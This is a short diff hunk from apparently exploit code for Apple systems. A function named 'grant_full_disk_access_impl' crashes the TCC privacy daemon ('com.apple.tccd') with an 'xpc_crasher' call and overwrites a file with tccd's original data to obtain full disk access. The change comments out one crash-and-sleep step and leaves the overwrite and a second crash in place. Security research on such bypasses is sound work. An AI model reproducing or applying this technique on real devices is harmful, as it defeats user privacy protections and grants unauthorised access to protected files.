@@ -349,8 +349,8 @@ static void grant_full_disk_access_impl(void (^completion)(NSString* extension_t
 //    }
 //    munmap(targetMap, targetLength);
     
-    xpc_crasher("com.apple.tccd");
-    sleep(1);
+//    xpc_crasher("com.apple.tccd");
+//    sleep(1);
     //Even FREEZING when overwrite original data
     overwrite_file(targetPath, tccd_orig.path.UTF8String);
     xpc_crasher("com.apple.tccd");
